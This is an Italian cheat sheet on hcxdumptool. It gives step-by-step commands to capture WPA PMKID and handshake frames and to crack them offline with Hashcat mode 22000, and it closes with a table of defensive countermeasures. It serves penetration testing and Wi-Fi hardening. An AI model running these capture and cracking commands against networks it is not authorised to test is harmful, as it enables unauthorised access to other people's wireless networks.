<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Foglio informativo hcxdumptool

[hcxdumptool](https://github.com/ZerBea/hcxdumptool) è uno strumento moderno e ad alte prestazioni per l'attacco Wi-Fi e l'acquisizione di pacchetti da riga di comando. A differenza degli strumenti Aircrack-ng legacy, `hcxdumptool` cattura frame WPA/WPA2/WPA3 PMKID (Pairwise Master Key Identifier) ​​senza richiedere client connessi, cattura EAPOL 4-way handshake e si integra direttamente con `hcxtools` per Hashcat cracking (modalità 22000).

---

## Sommario

- [Vantaggi principali e architettura moderna](#vantaggi-principali--architettura-moderna)
- [Installazione (`hcxdumptool` e `hcxtools`)](#installation-hcxdumptool--hcxtools)
- [Configurazione interfaccia wireless](#configurazione-interfaccia wireless)
- [Catturare PMKID (attacco clientless)](#capturing-pmkid-clientless-attack)
- [Conversione delle acquisizioni con `hcxpcapngtool`](#converting-captures-with-hcxpcapngtool)
- [Hashcat Cracking (modalità 22000)](#hashcat-cracking-mode-22000)
- [Filtrare canali e BSSID](#filtrare-canali-e-bssid)
- [Contromisure difensive e WPA3](#contromisure-difensive--wpa3)

---

## Vantaggi principali e architettura moderna

- **Attacco PMKID clientless:** sfrutta la funzionalità PMKID RSN IE (Robust Security Network Information Element) nei router moderni. **Non** è necessario un client connesso o pacchetti di deautenticazione per acquisire il materiale della chiave.
- **Unified Hashcat Mode 22000:** Genera file hash nativi di Hashcat che supportano sia PMKID che handshake WPA-PBKDF2-PMK completi.
- **Channel Hopping e interrogazione attiva:** trasmette richieste di associazione mirate per ottenere PMKID dagli AP in ascolto.

---

## Installazione (`hcxdumptool` e `hcxtools`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y hcxdumptool hcxtools

# Arch Linux / BlackArch
sudo pacman -S hcxdumptool hcxtools

# Verify versions
hcxdumptool --version
hcxpcapngtool --version
```
---

## Configurazione dell'interfaccia wireless

Prima di eseguire `hcxdumptool`, terminare i servizi di gestione della rete in background che interferiscono con l'inserimento di pacchetti non elaborati:
```bash
# 1. Terminate interfering network services (NetworkManager, wpa_supplicant)
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# 2. Put wireless card in monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 3. Verify monitor mode
iw dev
```
---

## Acquisizione di PMKID (attacco clientless)

### 1. Acquisizione PMKID generale su tutti i canali a 2,4 GHz e 5 GHz
Cattura tutti i punti di accesso vicini in un file `.pcapng`:
```bash
sudo hcxdumptool -i wlan0 -w capture.pcapng --rds=1
```
- `-i wlan0`: interfaccia monitor wireless.
- `-w capture.pcapng`: file di acquisizione in uscita.
- `--rds=1`: trasmette frame RTS per richiedere risposte AP.

### 2. Cattura un punto di accesso di destinazione specifico (filtro BSSID)
Scegli come target solo un BSSID autorizzato per evitare di influenzare router di terze parti non autorizzati:

1. Creare un elenco di filtri di destinazione (`target_bssid.txt`):
```text
001122334455
```
*(BSSID senza due punti)*

2. Esegui l'acquisizione mirata:
```bash
sudo hcxdumptool -i wlan0 -w target.pcapng --bpfp=target_bssid.txt -c 6
```
- `-c 6`: Blocca l'iniezione e l'ascolto del canale 6.
- `--bpfp`: applica l'elenco BPF (Berkeley Packet Filter) per i BSSID di destinazione.

---

## Conversione delle acquisizioni con `hcxpcapngtool`

Una volta raccolti i frame PMKID o EAPOL, convertire l'acquisizione `.pcapng` in un formato compatibile con Hashcat:
```bash
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
```
- `-o hash.hc22000`: file hash di output nel moderno formato Hashcat.
- `-E essid_list.txt`: salva i nomi di rete scoperti (ESSID) in un dizionario per il cracking mirato delle password.
- Lo strumento riporta il totale dei frame PMKID ed EAPOL estratti.

---

## Cracking di Hashcat (modalità 22000)

La modalità `22000` è la modalità di cracking WPA-PBKDF2-PMKID + EAPOL unificata di Hashcat:

### 1. Attacco al dizionario
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
### 2. Attacco di mutazione basato su regole
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### 3. Maschera/Attacco di forza bruta (password numeriche a 8 cifre)
```bash
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
---

## Filtraggio di canali e BSSID

Ottimizza la velocità di acquisizione limitando i parametri di scansione:
```bash
# Scan only specific channels (e.g. 1, 6, 11)
sudo hcxdumptool -i wlan0 -w filtered.pcapng -c 1,6,11
```
---

## Contromisure difensive e WPA3

| Vulnerabilità | Meccanismo di attacco | Raccomandazione sulla difesa |
|---|---|---|
| **Memoria nella cache PMKID** | AP trasmette PMKID nel frame EAPOL 1 senza autenticazione del client | Disabilitare 802.11r (Transizione Rapida/Roaming) se non necessario; aggiornare il firmware del router. |
| **Chiave precondivisa WPA2 debole** | Cracking del dizionario PBKDF2 offline (modalità Hashcat 22000) | Applica passphrase casuali di oltre 16 caratteri. |
| **Protocollo WPA2 precedente** | Sensibile a PMKID e acquisizione tramite stretta di mano | Aggiornamento a **WPA3-Personal (SAE)**; WPA3 utilizza l'handshake Dragonfly con segretezza in avanti, rendendo i fotogrammi catturati inattaccabili offline. |